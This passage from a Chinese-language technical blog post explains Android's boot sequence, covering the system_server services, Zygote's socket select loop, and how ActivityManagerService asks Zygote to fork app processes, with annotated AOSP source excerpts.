catch中执行MethodAndArgsCaller.run；在这里通过反射执行SystemServer.main()方法</li><li>在SystemServer.run方法中做一些设置，比如初始化系统上下文 ，创建SystemServiceManager，启动引导服务，启动核心服务，启动其他服务</li><li>最后调用Looper.loop()，不断的从消息队列取出消息处理(Looper#loop()方法中调用的是MessageQueue#next()，该方法中使用死循环 + Linuxepoll机制持续运行程序)</li></ol><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">system server进程和zygote进程可以说是<span class="hljs-keyword">Android世界中的两大最重要的进程，离开其中之一基本上系统就玩完了；基本上在Java </span>Framework中的大多数服务都是在system server进程中一个线程的方式存在的，如下：<br><br>EntropyService 提供伪随机数<br>PowerManagerService 电源管理服务<br>ActivityManagerService 最核心的服务之一，管理 四大组件<br>TelephonyRegistry 通过该服务注册电话模块的事件响应，比如重启、关闭、启动等<br>PackageManagerService 程序包管理服务<br>AccountManagerService 账户管理服务，是指联系人账户，而不是 Linux 系统的账户<br>ContentService ContentProvider 服务，提供跨进程数据交换<br><span class="hljs-keyword">BatteryService </span>电池管理服务<br>LightsService 自然光强度感应传感器服务<br>VibratorService 震动器服务<br>AlarmManagerService 定时器管理服务，提供定时提醒服务<br>WindowManagerService Framework 最核心的服务之一，负责窗口管理<br><span class="hljs-keyword">BluetoothService </span>蓝牙服务<br>DevicePolicyManagerService 提供一些系统级别的设置及属性<br>StatusBarManagerService 状态栏管理服务<br>ClipboardService 系统剪切板服务<br>InputMethodManagerService 输入法管理服务<br>NetStatService 网络状态服务<br>NetworkManagementService 网络管理服务<br>ConnectivityService 网络连接管理服务<br>ThrottleService 暂不清楚其作用<br>AccessibilityManagerService 辅助管理程序截获所有的用户输入，并根据这些输入给用户一些额外的反馈，起到辅助的效果<br>MountService 挂载服务，可通过该服务调用 Linux 层面的 mount 程序<br>NotificationManagerService 通知栏管理服务， <span class="hljs-keyword">Android </span>中的通知栏和状态栏在一起，只是界面上前者在左边，后者在右边<br>DeviceStorageMonitorService 磁盘空间状态检测服务<br>LocationManagerService 地理位置服务<br>SearchManagerService 搜索管理服务<br>DropBoxManagerService 通过该服务访问 Linux 层面的 Dropbox 程序<br>WallpaperManagerService 墙纸管理服务，墙纸不等同于桌面背景，在 View 系统内部，墙纸可以作为任何窗口的背景<br>AudioService 音频管理服务<br><span class="hljs-keyword">BackupManagerService </span>系统备份服务<br>AppWidgetService Widget 服务<br>RecognitionManagerService 身份识别服务<br><span class="hljs-keyword">DiskStatsService </span>磁盘统计服务<br></code></pre></td></tr></table></figure><h3 id="2-20-ZygoteInit-runSelectLoop"><a href="#2-20-ZygoteInit-runSelectLoop" class="headerlink" title="2.20 ZygoteInit.runSelectLoop()"></a>2.20 ZygoteInit.runSelectLoop()</h3><p>在2.9中ZygoteInit.main()方法开启system_server后，执行runSelectLoop()方法，进入循环监听事件</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> runSelectLoop(<span class="hljs-keyword">String</span> abiList) <span class="hljs-keyword">throws</span> MethodAndArgsCaller &#123;<br>    ArrayList&lt;FileDescriptor&gt; fds = <span class="hljs-keyword">new</span> ArrayList&lt;FileDescriptor&gt;();<br>    ArrayList&lt;ZygoteConnection&gt; peers = <span class="hljs-keyword">new</span> ArrayList&lt;ZygoteConnection&gt;();<br>    <span class="hljs-comment">//sServerSocket是socket通信中的服务端，即zygote进程。保存到fds[0]</span><br>    fds.<span class="hljs-built_in">add</span>(sServerSocket.getFileDescriptor());<br>    peers.<span class="hljs-built_in">add</span>(<span class="hljs-keyword">null</span>);<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-keyword">true</span>) &#123;<br>        StructPollfd[] pollFds = <span class="hljs-keyword">new</span> StructPollfd[fds.<span class="hljs-built_in">size</span>()];<br>        <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; pollFds.length; ++i) &#123;<br>            pollFds[i] = <span class="hljs-keyword">new</span> StructPollfd();<br>            pollFds[i].fd = fds.<span class="hljs-built_in">get</span>(i);<br>            pollFds[i].events = (<span class="hljs-keyword">short</span>) POLLIN;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>             <span class="hljs-comment">//处理轮询状态，当pollFds有事件到来则往下执行，否则阻塞在这里</span><br>            Os.poll(pollFds, <span class="hljs-number">-1</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (ErrnoException ex) &#123;<br>            ...<br>        &#125;<br>        <br>        <span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = pollFds.length - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; --i) &#123;<br>            <span class="hljs-comment">//采用I/O多路复用机制，当接收到客户端发出连接请求 或者数据处理请求到来，则往下执行；</span><br>            <span class="hljs-comment">// 否则进入continue，跳出本次循环。</span><br>            <span class="hljs-keyword">if</span> ((pollFds[i].revents &amp; POLLIN) == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-comment">//即fds[0]，代表的是sServerSocket，则意味着有客户端连接请求；</span><br>                <span class="hljs-comment">// 则创建ZygoteConnection对象,并添加到fds。</span><br>                ZygoteConnection newPeer = acceptCommandPeer(abiList);<br>                peers.<span class="hljs-built_in">add</span>(newPeer);<br>                fds.<span class="hljs-built_in">add</span>(newPeer.getFileDesciptor()); <span class="hljs-comment">//添加到fds.</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">//i&gt;0，则代表通过socket接收来自对端的数据，并执行相应操作</span><br>                <span class="hljs-built_in">boolean</span> done = peers.<span class="hljs-built_in">get</span>(i).runOnce();<br>                <span class="hljs-keyword">if</span> (done) &#123;<br>                    peers.remove(i);<br>                    fds.remove(i); <span class="hljs-comment">//处理完则从fds中移除该文件描述符</span><br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-21-ZygoteInit-acceptCommandPeer"><a href="#2-21-ZygoteInit-acceptCommandPeer" class="headerlink" title="2.21 ZygoteInit.acceptCommandPeer"></a>2.21 ZygoteInit.acceptCommandPeer</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> ZygoteConnection <span class="hljs-function"><span class="hljs-title">acceptCommandPeer</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> abiList</span>)</span> &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ZygoteConnection(sServerSocket.accept(), abiList);<br>    &#125; <span class="hljs-keyword">catch</span> (IOException ex) &#123;<br>        ...<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-22-ZygoteConnection-runOnce"><a href="#2-22-ZygoteConnection-runOnce" class="headerlink" title="2.22 ZygoteConnection.runOnce"></a>2.22 ZygoteConnection.runOnce</h3><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs aspectj"><span class="hljs-keyword">boolean</span> runOnce() <span class="hljs-keyword">throws</span> ZygoteInit.MethodAndArgsCaller &#123;<br><br>    String args[];<br>    Arguments parsedArgs = <span class="hljs-keyword">null</span>;<br>    FileDescriptor[] descriptors;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//读取socket客户端发送过来的参数列表</span><br>        args = readArgumentList();<br>        descriptors = mSocket.getAncillaryFileDescriptors();<br>    &#125; <span class="hljs-keyword">catch</span> (IOException ex) &#123;<br>        ...<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>    &#125;<br>    ...<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//将binder客户端传递过来的参数，解析成Arguments对象格式</span><br>        parsedArgs = <span class="hljs-keyword">new</span> Arguments(args);<br>        ...<br>        pid = Zygote.forkAndSpecialize(parsedArgs.uid, parsedArgs.gid, parsedArgs.gids,<br>                parsedArgs.debugFlags, rlimits, parsedArgs.mountExternal, parsedArgs.seInfo,<br>                parsedArgs.niceName, fdsToClose, parsedArgs.instructionSet,<br>                parsedArgs.appDataDir);<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-comment">//子进程执行</span><br>            IoUtils.closeQuietly(serverPipeFd);<br>            serverPipeFd = <span class="hljs-keyword">null</span>;<br>            <span class="hljs-comment">//进入子进程流程</span><br>            handleChildProc(parsedArgs, descriptors, childPipeFd, newStderr);<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//父进程执行</span><br>            IoUtils.closeQuietly(childPipeFd);<br>            childPipeFd = <span class="hljs-keyword">null</span>;<br>            <span class="hljs-function"><span class="hljs-keyword">return</span> <span class="hljs-title">handleParentProc</span><span class="hljs-params">(pid, descriptors, serverPipeFd, parsedArgs)</span></span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        IoUtils.closeQuietly(childPipeFd);<br>        IoUtils.closeQuietly(serverPipeFd);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>至此Zygote启动完成，开启循环<br>接收客户端发送过来的connect()操作，Zygote作为服务端执行accept()操作。 再后面客户端调用write()写数据，Zygote进程调用read()读数据。</p><p>没有连接请求时会进入休眠状态，当有创建新进程的连接请求时，唤醒Zygote进程，创建Socket通道ZygoteConnection，然后执行ZygoteConnection的runOnce()方法。</p><p>Zygote启动流程如下:</p><ol><li>解析init.zygote64_32.rc中的参数，创建AppRuntime并调用AppRuntime.start()方法</li><li>调用AndroidRuntime的startVM()方法创建虚拟机，再调用startReg()注册JNI函数</li><li>通过JNI方式调用ZygoteInit.main()，第一次进入Java世界</li><li>registerZygoteSocket()建立socket通道，zygote作为通信的服务端，用于响应客户端请求</li><li>preload()预加载通用类、drawable和color资源、openGL以及共享库以及WebView，用于提高app启动效率</li><li>通过startSystemServer()，fork得力帮手system_server进程，也是Java Framework的运行载体</li><li>调用runSelectLoop()，随时待命，当接收到请求创建新进程请求时立即唤醒并执行相应工作</li></ol><h2 id="3-Zygote进程是如何fork一个APP进程的"><a href="#3-Zygote进程是如何fork一个APP进程的" class="headerlink" title="3. Zygote进程是如何fork一个APP进程的"></a>3. Zygote进程是如何fork一个APP进程的</h2><p>创建一个线程大家肯定非常熟悉了，继承Thread，实现Runnable接口或者Callable接口；但是线程没有独立的地址空间，而是与所在进程共享内存，其实从Linux角度看，进程线程都是一个task_struct结构体，除了是否共享资源外，并没有其他本质的区别。</p><p>但是创建进程可能就没有那么熟悉了，每个APP可能运行在一个进程，也可能在多个进程，这些进程拥有自己独立的资源；然而这些进程都是由Zygote进程fork出来的，再往前一步其实是system server进程使用LocalSocket去通知zygote进程，然后zygote去fork一个子进程，也就是APP进程（更往前一步就是APP进程使用Binder机制去通知system server进程中的ActivityManagerService），注意这里是子进程，不是子线程</p><p>大体流程：</p><ol><li><p>app_process作为zygote server通过local socket处理进程创建请求，zygote server是在ZygoteInit.main函数里调用ZygoteInit.runSelectLoop监听。</p></li><li><p>接收到zygote client的fork请求之后，调用ZygoteConnection.runOnce，调用Zygote.forkAndSpecialize创建新进程</p></li><li><p>进程创建之后，由ZygoteConnection.handleParentProc来初始化进程，最终会调用ActivityThread.main函数</p></li><li><p>ActivityThread.main -&gt; ActivityThread.attach -&gt;  ActivityThread.bindApplication -&gt; Activity.handleBindApplication，handleBindApplication会初始化BaseDexClassLoader。</p></li><li><p>类的加载经过了ClassLoader.loadClass-&gt;BaseDexClassLoader.findClass-&gt;DexPathList.findClass-&gt;DexFile.loadClassBinaryName-&gt;DexFile.defineClassNative-&gt;DexFile_defineClassNative(art/runtime/native/dalvik_system_DexFile.cc)<br>这个初始化过程，art和dalvik都是一样的。art的DexFile_defineClassNative由ClassLinker的DefineClass来加载类。</p></li></ol><h3 id="3-1-APP进程创建流程"><a href="#3-1-APP进程创建流程" class="headerlink" title="3.1 APP进程创建流程"></a>3.1 APP进程创建流程</h3><ol><li>不管从桌面启动应用还是应用内启动其它应用，如果这个应用所在进程不存在的话，都需要发起进程通过Binder机制告诉system server进程的AMS</li><li>system server进程的AMS调用Process.start()方法，通过socket向zygote进程发送创建新进程的请求</li><li>在zygote进程的ZygoteInit.main方法中，有一个runSelectLoop循环体，通过acceptCommandPeer方法获取链接过来的客户端，再通过runOnce方法去创建进程</li><li>新的进程执行handleChildProc方法，最后通过反射调用ActivityThread.main()方法，这样一个新的APP进程就创建完成了</li></ol> <img src="/2021/08/23/android%E5%BC%80%E6%9C%BA%E5%90%8E%E9%83%BD%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88/images/APP%E8%BF%9B%E7%A8%8B%E5%88%9B%E5%BB%BA%E6%B5%81%E7%A8%8B.png" class=""><h3 id="3-2-APP启动第三方应用"><a href="#3-2-APP启动第三方应用" class="headerlink" title="3.2 APP启动第三方应用"></a>3.2 APP启动第三方应用</h3><h4 id="3-2-1-startActivity"><a href="#3-2-1-startActivity" class="headerlink" title="3.2.1 startActivity"></a>3.2.1 startActivity</h4><p>当你在桌面启动一个应用或者在一个APP内启动一个应用，本质都是一样的，因为Android手机桌面其实就是一个APP（这点可参考Android之Activity启动流程源码深入解析），两种方式经过层层调用之后都会走到ActivityStackSupervisor.startSpecificActivityLocked方法，判断如果对方进程不存在，就需要去创建一个进程</p><h4 id="3-2-2-startService"><a href="#3-2-2-startService" class="headerlink" title="3.2.2 startService"></a>3.2.2 startService</h4><p>调用startService启动一个服务，该方法经过层层调用最终会走到ActiveServices.bringUpServiceLocked方法，如果判断对方进程不存在也会去创建一个新进程</p><h4 id="3-2-3-sendBroadcast"><a href="#3-2-3-sendBroadcast" class="headerlink" title="3.2.3 sendBroadcast"></a>3.2.3 sendBroadcast</h4><p>调用sendBroadcast方法去发送一个广播，经过层层调用后走到BroadcastQueue.processNextBroadcast方法，也会判断BroadcastReceiver所在进程不存在就需要去创建进程</p><h4 id="3-2-4-ContentResolver-query"><a href="#3-2-4-ContentResolver-query" class="headerlink" title="3.2.4 ContentResolver.query"></a>3.2.4 ContentResolver.query</h4><p>在ContentProvider的处理过程中，ContentResolver.query方法经过层层调用会走到ActivityManagerService.getContentProviderImpl方法，判断ContentProvider所在的进程不存在就会创建新进程</p><h3 id="3-3-System-Server请求创建进程"><a href="#3-3-System-Server请求创建进程" class="headerlink" title="3.3 System Server请求创建进程"></a>3.3 System Server请求创建进程</h3><p>ActivityManagerService简称为AMS</p><p>上述四种途径最终都会走到AMS.startProcessLocked()方法</p><h4 id="3-3-1-AMS-startProcessLocked"><a href="#3-3-1-AMS-startProcessLocked" class="headerlink" title="3.3.1 AMS.startProcessLocked()"></a>3.3.1 AMS.startProcessLocked()</h4><p>源码位于frameworks/base/services/core/java/com/android/server/am/ActivityManagerService.java</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs processing"><span class="hljs-keyword">final</span> ProcessRecord startProcessLocked(<span class="hljs-keyword">String</span> processName,<br>            ApplicationInfo info, <span class="hljs-built_in">boolean</span> knownToBeDead, <span class="hljs-built_in">int</span> intentFlags,<br>            <span class="hljs-keyword">String</span> hostingType, ComponentName hostingName, <span class="hljs-built_in">boolean</span> allowWhileBooting,<br>            <span class="hljs-built_in">boolean</span> isolated, <span class="hljs-built_in">boolean</span> keepIfLarge) &#123;<br>        <span class="hljs-keyword">return</span> startProcessLocked(processName, info, knownToBeDead, intentFlags, hostingType,<br>                hostingName, allowWhileBooting, isolated, <span class="hljs-number">0</span> <span class="hljs-comment">/* isolatedUid */</span>, keepIfLarge,<br>                <span class="hljs-keyword">null</span> <span class="hljs-comment">/* ABI override */</span>, <span class="hljs-keyword">null</span> <span class="hljs-comment">/* entryPoint */</span>, <span class="hljs-keyword">null</span> <span class="hljs-comment">/* entryPointArgs */</span>,<br>                <span class="hljs-keyword">null</span> <span class="hljs-comment">/* crashHandler */</span>);<br>&#125;<br>    <br><span class="hljs-keyword">final</span> ProcessRecord startProcessLocked(<span class="hljs-keyword">String</span> processName, ApplicationInfo info,<br>            <span class="hljs-built_in">boolean</span> knownToBeDead, <span class="hljs-built_in">int</span> intentFlags, <span class="hljs-keyword">String</span> hostingType, ComponentName hostingName,<br>            <span class="hljs-built_in">boolean</span> allowWhileBooting, <span class="hljs-built_in">boolean</span> isolated, <span class="hljs-built_in">int</span> isolatedUid, <span class="hljs-built_in">boolean</span> keepIfLarge,<br>            <span class="hljs-keyword">String</span> abiOverride, <span class="hljs-keyword">String</span> entryPoint, <span class="hljs-keyword">String</span>[] entryPointArgs, Runnable crashHandler) &#123;<br>        <span class="hljs-keyword">long</span> startTime = SystemClock.elapsedRealtime();<br>        ProcessRecord app;<br>        <span class="hljs-comment">//不处于孤立进程</span><br>        <span class="hljs-keyword">if</span> (!isolated) &#123;<br>        <span class="hljs-comment">//根据进程名和进程uid获取进程对应的ProcessRecord</span><br>        <span class="hljs-comment">//ProcessRecord封装了正在运行的进程的完整信息</span><br>            app = getProcessRecordLocked(processName, info.uid, keepIfLarge);<br>            checkTime(startTime, <span class="hljs-string">&quot;startProcess: after getProcessRecord&quot;</span>);<br><br>            <span class="hljs-keyword">if</span> ((intentFlags &amp; Intent.FLAG_FROM_BACKGROUND) != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-comment">// 如果当前进程处于后台进程，就判断是否在Bad进程列表</span><br>                <span class="hljs-keyword">if</span> (mAppErrors.isBadProcessLocked(info)) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// 如果用户明确启动该进程，则清除其crash计数，保证其不处于Bad进程列表，直到下次再弹出crash框</span><br>                mAppErrors.resetProcessCrashTimeLocked(info);<br>                <span class="hljs-keyword">if</span> (mAppErrors.isBadProcessLocked(info)) &#123;<br>                    EventLog.writeEvent(EventLogTags.AM_PROC_GOOD,<br>                            UserHandle.getUserId(info.uid), info.uid,<br>                            info.processName);<br>                    mAppErrors.clearBadProcessLocked(info);<br>                    <span class="hljs-keyword">if</span> (app != <span class="hljs-keyword">null</span>) &#123;<br>                        app.bad = <span class="hljs-keyword">false</span>;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 如果是孤立进程，就没办法重用已存在的进程</span><br>            app = <span class="hljs-keyword">null</span>;<br>        &#125;<br><br>......<br><br><span class="hljs-comment">//当ProcessRecord已经存在；</span><br><span class="hljs-comment">//并且调用者不认为进程已经死亡，或者没有thread对象依附到该进程，这样我们就知道他不会crash；</span><br><span class="hljs-comment">//该进程已经分配了pid，说明它正在启动或正在运行</span><br><span class="hljs-comment">//这些情况下我们不需要做什么，直接返回</span><br>        <span class="hljs-keyword">if</span> (app != <span class="hljs-keyword">null</span> &amp;&amp; app.pid &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> ((!knownToBeDead &amp;&amp; !app.killed) || app.thread == <span class="hljs-keyword">null</span>) &#123;<br>                <span class="hljs-comment">//我们已经启动了这个app，或者正在等待它启动（分配了pid但是没有thread依附），就keep it</span><br>                <span class="hljs-comment">// 如果这是该进程中的一个新的package，那就添加到package列表</span><br>                app.addPackage(info.packageName, info.versionCode, mProcessStats);<br>                checkTime(startTime, <span class="hljs-string">&quot;startProcess: done, added package to proc&quot;</span>);<br>                <span class="hljs-keyword">return</span> app;<br>            &#125;<br><br>            <span class="hljs-comment">// 如果ProcessRecord已经attach到先前的进程，那就清除它</span><br>            checkTime(startTime, <span class="hljs-string">&quot;startProcess: bad proc running, killing&quot;</span>);<br>            killProcessGroup(app.uid, app.pid);<br>            handleAppDiedLocked(app, <span class="hljs-keyword">true</span>, <span class="hljs-keyword">true</span>);<br>            checkTime(startTime, <span class="hljs-string">&quot;startProcess: done killing old proc&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">String</span> hostingNameStr = hostingName != <span class="hljs-keyword">null</span><br>                ? hostingName.flattenToShortString() : <span class="hljs-keyword">null</span>;<br><br>        <span class="hljs-keyword">if</span> (app == <span class="hljs-keyword">null</span>) &#123;<br>            checkTime(startTime, <span class="hljs-string">&quot;startProcess: creating new process record&quot;</span>);<br>            <span class="hljs-comment">// 创建新的Process Record对象</span><br>            app = newProcessRecordLocked(info, processName, isolated, isolatedUid);<br>            <span class="hljs-keyword">if</span> (app == <span class="hljs-keyword">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>            &#125;<br>            app.crashHandler = crashHandler;<br>            checkTime(startTime, <span class="hljs-string">&quot;startProcess: done creating new process record&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 如果这是该进程中的一个新的package，那就添加到package列表</span><br>            app.addPackage(info.packageName, info.versionCode, mProcessStats);<br>            checkTime(startTime, <span class="hljs-string">&quot;startProcess: added package to existing proc&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-comment">// 如果系统还没有准备就绪，那就暂停该进程启动，将当前进程加入到mProcessesOnHold，直到准备就绪</span><br>        <span class="hljs-keyword">if</span> (!mProcessesReady<br>                &amp;&amp; !isAllowedWhileBooting(info)<br>                &amp;&amp; !allowWhileBooting) &#123;<br>            <span class="hljs-keyword">if</span> (!mProcessesOnHold.contains(app)) &#123;<br>                mProcessesOnHold.<span class="hljs-built_in">add</span>(app);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (DEBUG_PROCESSES) Slog.v(TAG_PROCESSES,<br>                    <span class="hljs-string">&quot;System not ready, putting on hold: &quot;</span> + app);<br>            checkTime(startTime, <span class="hljs-string">&quot;startProcess: returning with proc on hold&quot;</span>);<br>            <span class="hljs-keyword">return</span> app;<br>        &#125;<br><br>        checkTime(startTime, <span class="hljs-string">&quot;startProcess: stepping in to startProcess&quot;</span>);<br>        startProcessLocked(<br>                app, hostingType, hostingNameStr, abiOverride, entryPoint, entryPointArgs);<br>        checkTime(startTime, <span class="hljs-string">&quot;startProcess: done starting proc!&quot;</span>);<br>        <span class="hljs-keyword">return</span> (app.pid != <span class="hljs-number">0</span>) ? app : <span class="hljs-keyword">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>经过上面重重判断后决定需要创建进程，继续走到startProcessLocked方法，这个方法在AMS里有4个重载的方法</p><p>其中的hostingType参数有”activity”,”service”,”broadcast”,”content provider”四个值<br>hostingNameStr数据类型为ComponentName,封装了组件的包名和自己的路径</p><h4 id="3-3-2-继续调用AMS-startProcessLocked"><a href="#3-3-2-继续调用AMS-startProcessLocked" class="headerlink" title="3.3.2 继续调用AMS.startProcessLocked()"></a>3.3.2 继续调用AMS.startProcessLocked()</h4><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 